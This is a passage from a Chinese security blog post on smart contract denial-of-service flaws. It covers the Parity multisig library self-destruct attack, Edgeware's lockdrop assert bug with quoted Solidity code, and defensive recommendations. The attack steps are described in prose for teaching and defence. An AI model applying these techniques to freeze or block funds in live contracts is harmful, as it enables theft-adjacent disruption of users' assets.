+<h1 id="0x08-依赖库问题"><a href="#0x08-依赖库问题" class="headerlink" title="0x08 依赖库问题"></a>0x08 依赖库问题</h1><p>依赖外部的合约库。如果外部合约的库被删除，那么所有依赖库的合约服务都无法使用。有些合约用于接受ether，并转账给其他地址。但是，这些合约本身并没有自己实现一个转账函数，而是通过delegatecall去调用一些其他合约中的转账函数去实现转账的功能。</p>
+<p>万一这些提供转账功能的合约执行suicide或self-destruct操作的话，那么，通过delegatecall调用转账功能的合约就有可能发生ether被冻结的情况</p>
+<p>Parity 钱包遭受的第二次攻击是一个很好的例子。</p>
+<p>Parity 钱包提供了多签钱包的库合约。当库合约的函数被 delegatecall 调用时，它是运行在调用方（即：用户多签合约）的上下文里，像 m_numOwners 这样的变量都来自于用户多签合约的上下文。另外，为了能被用户合约调用，这些库合约的初始化函数都是public的。</p>
+<p>库合约本质上也不过是另外一个智能合约，这次攻击调用使用的是库合约本身的上下文，对调用者而言这个库合约是未经初始化的。</p>
+<p>攻击流程</p>
+<p>1.攻击者调用初始化函数把自己设置为库合约的 owner。</p>
+<p>2.攻击者调用 kill() 函数，把库合约删除，所有的 ether 就被冻结了</p>
+<h1 id="0x09-逻辑设计错误"><a href="#0x09-逻辑设计错误" class="headerlink" title="0x09 逻辑设计错误"></a>0x09 逻辑设计错误</h1><p>本类型漏洞分析Edgeware锁仓合约的拒绝服务漏洞</p>
+<p>Edgeware锁仓合约可以理解为你往银行里定期存款，之后会给你收益，关键点在于发送token后要进行lock操作，把你的资金锁起来，暂时无法提现，本类型漏洞会导致参与者lock失败，从而无法获得收益。</p>
+<p>关键代码</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">lock</span>(<span class="params">Term term, bytes calldata edgewareAddr, bool isValidator</span>)</span></span><br><span class="line"><span class="function">       <span class="title">external</span></span></span><br><span class="line"><span class="function">       <span class="title">payable</span></span></span><br><span class="line"><span class="function">       <span class="title">didStart</span></span></span><br><span class="line"><span class="function">       <span class="title">didNotEnd</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       uint256 eth = msg.value;</span><br><span class="line">       address owner = msg.sender;</span><br><span class="line">       uint256 unlockTime = unlockTimeForTerm(term);</span><br><span class="line">       <span class="comment">// Create ETH lock contract</span></span><br><span class="line">       Lock lockAddr = (<span class="keyword">new</span> Lock).value(eth)(owner, unlockTime);</span><br><span class="line">       <span class="comment">// ensure lock contract has at least all the ETH, or fail</span></span><br><span class="line">       assert(address(lockAddr).balance &gt;= msg.value);</span><br><span class="line">       emit Locked(owner, eth, lockAddr, term, edgewareAddr, isValidator, now);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title"><span class="built_in">assert</span></span>(<span class="title">address</span>(<span class="variable">lockAddr</span>).balance &gt;= <span class="variable">msg.value</span>);</span></span><br></pre></td></tr></table></figure>
+<p>​    这段代码做了强制判断：属于参与者的 Lock 合约的金额必须等于参与者锁仓时发送的金额，如果不等于，意味着 lock 失败，这个失败会导致参与者的 Lock 合约“瘫痪”而形成“拒绝服务”，直接后果就是：假如攻击持续着，Edgeware 这个 Lockdrop 机制将不再可用。    但这个漏洞对参与者的资金无影响。那么，什么情况下会导致“address(lockAddr).balance 不等于 msg.value” 攻击者如果能提前推测出参与者的 Lock 合约地址就行（这在以太坊黄皮书里有明确介绍，可以计算出来），此时攻击者只需提前往参与者的 Lock 合约地址随便转点 ETH 就好，就会导致参与者无法lock从而无法获取收益</p>
+<h1 id="0x0a-防御措施"><a href="#0x0a-防御措施" class="headerlink" title="0x0a 防御措施"></a>0x0a 防御措施</h1><ul>
+<li><p>未设定gas费率的外部调用</p>
+<p>使用call函数时可以调试出执行操作需要的大致gas费率，在call函数指定稍大一些费率，避免攻击发生。</p>
+</li>
+<li><p>依赖外部的调用进展</p>
+<p>在竞拍合约中尽量让合约参与者自提参与竞拍的token，其次如果确实需要对外部函数调用的结果进行处理才能进入新的状态，请考虑外部调用可能一直失败的情况，也可以添加基于时间的操作，防止外部函数调用一直无法满足require判断。</p>
+</li>
+<li><p>owner错误操作</p>
+<p>建议设计多个owner地址，避免密钥遗失等问题发生时，导致合约被锁，同时一个综合系统中只有一个绝对权限的管理员是极其不安全的。</p>
+</li>
+<li><p>数组或映射过长</p>
+<p>避免需要循环操作的数组或映射能够被外部调用，同时在合理的增长过程，可以采用分区块处理的方式，避免数组或映射过大失败。</p>
+</li>
+<li><p>依赖库问题</p>
+<p>继承库合约后，对于可以改变指智能合约存储状态的函数，尽量采取重写的方式，避免被恶意调用。特别是owner修饰词，转账函数。</p>
+</li>
+<li><p>逻辑设计错误</p>
+<p>合约正式上链之前一定要进行审计，避免未知的情况发生。特别是判断条件，慎之又慎。之前的有一个案例</p>
+<figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">require</span>(<span class="variable">msg.<span class="class">sender</span></span>==<span class="variable">owner</span>);<span class="title">require</span>(<span class="variable">msg.<span class="class">sender</span></span><span class="variable">!</span>=<span class="variable">owner</span>);</span></span><br></pre></td></tr></table></figure>
+<p>本应该是上面的写法却写成了下面的代码。</p>
+</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>Zpano
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://zpano.cn/2021/07/19/20/" title="智能合约拒绝服务漏洞">https://zpano.cn/2021/07/19/20/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/" rel="tag"># 区块链安全</a>
+              <a href="/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8/" rel="tag"># 智能合约安全</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2021/07/09/19/" rel="prev" title="智能合约变量储存机制详解">
+                  <i class="fa fa-chevron-left"></i> 智能合约变量储存机制详解
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2021/07/21/21/" rel="next" title="浅谈智能合约evilReflex漏洞">
+                  浅谈智能合约evilReflex漏洞 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+      
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      const activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      const commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+    </div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+      
+
+      
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Zpano</span>
+</div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">190k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">2:53</span>
+  </span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+    </div>
+  </footer>
+
+  
+  <script src="//cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+  <script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+
+
+
+  
+
+  
+      <script>
+  if (typeof MathJax === 'undefined') {
+    window.MathJax = {
+      tex: {
+        inlineMath: {'[+]': [['$', '$']]},
+        tags: 'ams'
+      },
+      options: {
+        renderActions: {
+          findScript: [10, doc => {
+            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+              const display = !!node.type.match(/; *mode=display/);
+              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+              const text = document.createTextNode('');
+              node.parentNode.replaceChild(text, node);
+              math.start = {node: text, delim: '', n: 0};
+              math.end = {node: text, delim: '', n: 0};
+              doc.math.push(math);
+            });
+          }, '', false],
+          insertedScript: [200, () => {
+            document.querySelectorAll('mjx-container').forEach(node => {
+              const target = node.parentNode;
+              if (target.nodeName.toLowerCase() === 'li') {
+                target.parentNode.classList.add('has-jax');
+              }
+            });
+          }, '', false]
+        }
+      }
+    };
+    const script = document.createElement('script');
+    script.src = '//cdn.jsdelivr.net/npm/mathjax@3.1.2/es5/tex-mml-chtml.js';
+    script.defer = true;
+    document.head.appendChild(script);
+  } else {
+    MathJax.startup.document.state(0);
+    MathJax.typesetClear();
+    MathJax.texReset();
+    MathJax.typeset();
+  }
+</script>
+
+    
+
+  
+
+</body>
+</html>
